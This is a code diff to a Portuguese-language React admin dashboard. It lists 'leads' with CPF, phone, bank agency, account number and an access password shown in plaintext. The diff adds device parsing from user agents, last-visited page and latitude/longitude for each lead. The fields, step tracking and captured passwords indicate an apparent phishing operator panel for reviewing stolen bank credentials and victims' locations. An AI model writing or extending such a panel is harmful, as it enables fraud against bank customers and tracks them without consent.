@@ -3,12 +3,89 @@ import { supabase } from "@/integrations/supabase/client";
 import { leadRepository, sessionRepository, configRepository, type Lead } from "@/repositories";
 import {
   Search, RefreshCw, Eye, EyeOff, Trash2, Copy,
-  CheckSquare, Square, Archive, ArchiveRestore, Tag, X,
+  CheckSquare, Square, Archive, ArchiveRestore, Tag, X, MapPin, Monitor,
 } from "lucide-react";
 import {
   Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription,
 } from "@/components/ui/dialog";
 import { toast } from "sonner";
+
+// ── Helpers ─────────────────────────────────────────────────────────────────
+
+function formatDT(iso: string | null | undefined): string {
+  if (!iso) return "—";
+  const d = new Date(iso);
+  const pad = (n: number) => String(n).padStart(2, "0");
+  return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())} ${pad(d.getDate())}/${pad(d.getMonth() + 1)}/${d.getFullYear()}`;
+}
+
+function parseDevice(ua: string | null | undefined, isMobile?: boolean | null): string {
+  if (!ua) return isMobile ? "Mobile" : "Desktop";
+  const mobile = isMobile ?? /Mobile|Android|iPhone|iPad/i.test(ua);
+
+  // Browser
+  let browser = "Browser";
+  if (/SamsungBrowser/i.test(ua)) browser = "Samsung Browser";
+  else if (/EdgA?/i.test(ua)) browser = "Edge";
+  else if (/OPR|Opera/i.test(ua)) browser = "Opera";
+  else if (/Chrome/i.test(ua)) browser = "Chrome";
+  else if (/Firefox/i.test(ua)) browser = "Firefox";
+  else if (/Safari/i.test(ua)) browser = "Safari";
+
+  if (!mobile) {
+    // Desktop: just OS + browser
+    let os = "Unknown";
+    if (/Windows/i.test(ua)) os = "Windows";
+    else if (/Macintosh|Mac OS X/i.test(ua)) os = "macOS";
+    else if (/Linux/i.test(ua)) os = "Linux";
+    return `Desktop - ${os} - ${browser}`;
+  }
+
+  // Mobile: model from UA
+  let model = "Unknown";
+  let brand = "Unknown";
+
+  // iPhone
+  const iphoneMatch = ua.match(/iPhone\s*OS\s*[\d_]+/i);
+  if (iphoneMatch) { model = "iPhone"; brand = "Apple"; }
+  // iPad
+  else if (/iPad/i.test(ua)) { model = "iPad"; brand = "Apple"; }
+  // Android model: "Android x.x; MODEL"
+  else {
+    const androidMatch = ua.match(/Android[^;]*;\s*([^)]+)\)/);
+    if (androidMatch) {
+      model = androidMatch[1].trim();
+      // Detect brand from model prefix
+      if (/samsung/i.test(ua)) brand = "Samsung";
+      else if (/xiaomi|redmi|mi\s/i.test(ua)) brand = "Xiaomi";
+      else if (/motorola|moto\s/i.test(ua)) brand = "Motorola";
+      else if (/lg-/i.test(ua)) brand = "LG";
+      else if (/huawei/i.test(ua)) brand = "Huawei";
+      else if (/nokia/i.test(ua)) brand = "Nokia";
+      else if (/sony/i.test(ua)) brand = "Sony";
+      else brand = "Unknown";
+    }
+  }
+
+  return `Mobile - ${model} - ${brand} - ${browser}`;
+}
+
+function deriveTipo(cpf: string | null | undefined): string {
+  if (!cpf) return "—";
+  const digits = cpf.replace(/\D/g, "");
+  if (digits.length === 11) return "FÍSICA";
+  if (digits.length === 14) return "JURÍDICA";
+  return "—";
+}
+
+interface LastSession {
+  page: string | null;
+  user_agent: string | null;
+  last_seen_at: string | null;
+  latitude: number | null;
+  longitude: number | null;
+  is_mobile: boolean | null;
+}
 
 // ── Constants ───────────────────────────────────────────────────────────────
 
@@ -51,6 +128,8 @@ export default function AdminDashboard() {
   const [leads, setLeads] = useState<Lead[]>([]);
   const [search, setSearch] = useState("");
   const [selected, setSelected] = useState<Lead | null>(null);
+  const [selectedIdx, setSelectedIdx] = useState<number | null>(null);
+  const [selectedSession, setSelectedSession] = useState<LastSession | null>(null);
   const [loading, setLoading] = useState(true);
   const [loadingMore, setLoadingMore] = useState(false);
   const [checked, setChecked] = useState<Set<string>>(new Set());
@@ -117,6 +196,25 @@ export default function AdminDashboard() {
     } finally {
       setLoadingMore(false);
     }
+  };
+
+  const fetchLeadLastSession = async (leadId: string) => {
+    setSelectedSession(null);
+    const { data } = await supabase
+      .from("site_sessions")
+      .select("page, user_agent, last_seen_at, latitude, longitude, is_mobile")
+      .eq("lead_id", leadId)
+      .order("last_seen_at", { ascending: false })
+      .limit(1)
+      .single();
+    if (data) setSelectedSession(data as LastSession);
+  };
+
+  const handleSelectLead = (lead: Lead, idx: number) => {
+    setSelected(lead);
+    setSelectedIdx(idx + 1);
+    setSelectedPwdVisible(false);
+    fetchLeadLastSession(lead.id);
   };
 
   // ── Effects ──
@@ -380,7 +478,7 @@ export default function AdminDashboard() {
                 ) : filtered.length === 0 ? (
                   <tr><td colSpan={11} className="px-4 py-8 text-center text-muted-foreground font-mono text-xs">Nenhuma ficha encontrada</td></tr>
                 ) : (
-                  filtered.map((lead) => (
+                  filtered.map((lead, idx) => (
                     <tr key={lead.id} className={`border-b border-border last:border-0 hover:bg-muted/30 transition-colors ${checked.has(lead.id) ? "bg-primary/5" : ""}`}>
                       <td className="px-3 py-3 text-center">
                         <button onClick={() => toggleCheck(lead.id)} className="text-muted-foreground hover:text-foreground transition-colors">
@@ -442,7 +540,7 @@ export default function AdminDashboard() {
                           <button onClick={() => handleCopyOne(lead)} title="Copiar dados" className="rounded-lg p-1.5 text-muted-foreground hover:bg-muted hover:text-foreground transition-colors">
                             <Copy className="h-4 w-4" />
                           </button>
-                          <button onClick={() => setSelected(lead)} title="Ver detalhes" className="rounded-lg p-1.5 text-muted-foreground hover:bg-muted hover:text-foreground transition-colors">
+                          <button onClick={() => handleSelectLead(lead, idx)} title="Ver detalhes" className="rounded-lg p-1.5 text-muted-foreground hover:bg-muted hover:text-foreground transition-colors">
                             <Eye className="h-4 w-4" />
                           </button>
                         </div>
@@ -465,40 +563,133 @@ export default function AdminDashboard() {
       </div>
 
       {/* ── Lead detail dialog ── */}
-      <Dialog open={!!selected} onOpenChange={() => { setSelected(null); setSelectedPwdVisible(false); }}>
-        <DialogContent>
+      <Dialog open={!!selected} onOpenChange={() => { setSelected(null); setSelectedIdx(null); setSelectedSession(null); setSelectedPwdVisible(false); }}>
+        <DialogContent className="max-w-xl max-h-[85vh] overflow-y-auto">
           <DialogHeader>
-            <DialogTitle>Ficha do Lead</DialogTitle>
-            <DialogDescription>Detalhes completos</DialogDescription>
+            <DialogTitle className="font-mono text-sm tracking-tight">
+              Ficha do Lead {selectedIdx !== null ? `#${selectedIdx}` : ""}
+            </DialogTitle>
+            <DialogDescription className="font-mono text-xs">{selected?.cpf || selected?.nome || selected?.id}</DialogDescription>
           </DialogHeader>
           {selected && (
-            <div className="space-y-3 text-sm">
-              {([
-                ["CPF", selected.cpf], ["Telefone", selected.phone], ["Nome", selected.nome],
-                ["Segmento", selected.segment], ["Agência", selected.agency], ["Conta", selected.account],
-                ["Etapa Atual", STEP_LABELS[selected.current_step] || selected.current_step],
-                ["Status", selected.status === "concluido" ? "Concluído" : "Em andamento"],
-                ["Tags", (selected.tags ?? []).join(", ") || "—"],
-                ["Criado em", new Date(selected.created_at).toLocaleString("pt-BR")],
-                ["Atualizado", new Date(selected.updated_at).toLocaleString("pt-BR")],
-              ] as [string, string | null | undefined][]).map(([label, value]) => (
-                <div key={label} className="flex justify-between border-b border-border pb-2 last:border-0">
-                  <span className="text-muted-foreground font-mono text-xs">{label}</span>
-                  <span className="font-medium text-foreground text-xs font-mono">{value || "—"}</span>
+            <div className="space-y-4 text-xs font-mono">
+
+              {/* ── Dados principais ── */}
+              <div className="rounded-lg border border-border bg-muted/20 divide-y divide-border">
+                {([
+                  ["ID Informação", String(selectedIdx ?? "—")],
+                  ["Tipo", deriveTipo(selected.cpf)],
+                  ["Nome", selected.nome],
+                  ["Agência", selected.agency],
+                  ["Conta", selected.account],
+                ] as [string, string | null | undefined][]).map(([label, value]) => (
+                  <div key={label} className="flex items-center justify-between px-3 py-2">
+                    <span className="text-muted-foreground">{label}</span>
+                    <span className="font-medium text-foreground">{value || "—"}</span>
+                  </div>
+                ))}
+                {/* Senha */}
+                <div className="flex items-center justify-between px-3 py-2">
+                  <span className="text-muted-foreground">Senha de Acesso</span>
+                  <span className="inline-flex items-center gap-1.5 font-bold text-foreground">
+                    {selected.password
+                      ? (selectedPwdVisible ? `${selected.password} / ${selected.password}` : "•••••• / ••••••")
+                      : "—"}
+                    {selected.password && (
+                      <button onClick={() => setSelectedPwdVisible((v) => !v)} className="text-muted-foreground hover:text-foreground transition-colors">
+                        {selectedPwdVisible ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
+                      </button>
+                    )}
+                  </span>
                 </div>
-              ))}
-              <div className="flex justify-between border-b border-border pb-2">
-                <span className="text-muted-foreground font-mono text-xs">Senha</span>
-                <span className="inline-flex items-center gap-1 font-medium text-foreground text-xs font-mono">
-                  {selected.password ? (selectedPwdVisible ? selected.password : "••••••") : "—"}
-                  {selected.password && (
-                    <button onClick={() => setSelectedPwdVisible((v) => !v)} className="text-muted-foreground hover:text-foreground transition-colors">
-                      {selectedPwdVisible ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
-                    </button>
-                  )}
-                </span>
+                {([
+                  ["CPF", selected.cpf],
+                  ["Celular", selected.phone],
+                  ["Seguimento", selected.segment],
+                ] as [string, string | null | undefined][]).map(([label, value]) => (
+                  <div key={label} className="flex items-center justify-between px-3 py-2">
+                    <span className="text-muted-foreground">{label}</span>
+                    <span className="font-medium text-foreground">{value || "—"}</span>
+                  </div>
+                ))}
+                {/* Status badge */}
+                <div className="flex items-center justify-between px-3 py-2">
+                  <span className="text-muted-foreground">Status</span>
+                  <span className={`inline-block rounded-full px-2 py-0.5 text-[10px] font-bold ${
+                    selected.status === "concluido" ? "bg-emerald-500/20 text-emerald-400" : "bg-orange-500/20 text-orange-400"
+                  }`}>
+                    {selected.status === "concluido" ? "CONCLUÍDO" : "INICIAL"}
+                  </span>
+                </div>
+                {/* Data criação */}
+                <div className="flex items-center justify-between px-3 py-2">
+                  <span className="text-muted-foreground">Data de criação</span>
+                  <span className="font-medium text-foreground">{formatDT(selected.created_at)}</span>
+                </div>
+                {/* Tags */}
+                {(selected.tags ?? []).length > 0 && (
+                  <div className="flex items-start justify-between px-3 py-2 gap-2">
+                    <span className="text-muted-foreground shrink-0">Tags</span>
+                    <div className="flex flex-wrap gap-1 justify-end">
+                      {(selected.tags ?? []).map((t) => (
+                        <span key={t} className="rounded-full bg-primary/15 px-2 py-0.5 text-[10px] text-primary">{t}</span>
+                      ))}
+                    </div>
+                  </div>
+                )}
               </div>
-              <button onClick={() => handleCopyOne(selected)} className="mt-2 flex w-full items-center justify-center gap-2 rounded-lg border border-border py-2 text-sm font-medium text-foreground hover:bg-muted transition-colors">
+
+              {/* ── Última vez Online ── */}
+              <div>
+                <p className="flex items-center gap-1.5 text-[10px] tracking-[0.15em] text-muted-foreground uppercase mb-2">
+                  <Monitor className="h-3 w-3" /> Última vez Online
+                </p>
+                <div className="rounded-lg border border-border bg-muted/20 divide-y divide-border">
+                  <div className="flex items-center justify-between px-3 py-2">
+                    <span className="text-muted-foreground">Página</span>
+                    <span className="font-medium text-foreground">
+                      {selectedSession?.page ? `/${selectedSession.page}` : "—"}
+                    </span>
+                  </div>
+                  <div className="flex items-center justify-between px-3 py-2">
+                    <span className="text-muted-foreground">Dispositivo</span>
+                    <span className="font-medium text-foreground text-right max-w-[55%]">
+                      {parseDevice(selectedSession?.user_agent, selectedSession?.is_mobile)}
+                    </span>
+                  </div>
+                  <div className="flex items-center justify-between px-3 py-2">
+                    <span className="text-muted-foreground">Última interação</span>
+                    <span className="font-medium text-foreground">{formatDT(selectedSession?.last_seen_at)}</span>
+                  </div>
+                  <div className="flex items-start justify-between px-3 py-2 gap-2">
+                    <span className="text-muted-foreground shrink-0">Useragent</span>
+                    <span className="text-muted-foreground text-right text-[10px] leading-relaxed max-w-[70%] break-all">
+                      {selectedSession?.user_agent || "—"}
+                    </span>
+                  </div>
+                </div>
+              </div>
+
+              {/* ── Localização ── */}
+              {(selectedSession?.latitude || selectedSession?.longitude) && (
+                <div>
+                  <p className="flex items-center gap-1.5 text-[10px] tracking-[0.15em] text-muted-foreground uppercase mb-2">
+                    <MapPin className="h-3 w-3" /> Localização
+                  </p>
+                  <div className="rounded-lg border border-border bg-muted/20 divide-y divide-border">
+                    <div className="flex items-center justify-between px-3 py-2">
+                      <span className="text-muted-foreground">Latitude</span>
+                      <span className="font-medium text-foreground">{selectedSession.latitude ?? "—"}</span>
+                    </div>
+                    <div className="flex items-center justify-between px-3 py-2">
+                      <span className="text-muted-foreground">Longitude</span>
+                      <span className="font-medium text-foreground">{selectedSession.longitude ?? "—"}</span>
+                    </div>
+                  </div>
+                </div>
+              )}
+
+              <button onClick={() => handleCopyOne(selected)} className="flex w-full items-center justify-center gap-2 rounded-lg border border-border py-2 text-sm font-medium text-foreground hover:bg-muted transition-colors">
                 <Copy className="h-4 w-4" /> Copiar dados
               </button>
             </div>
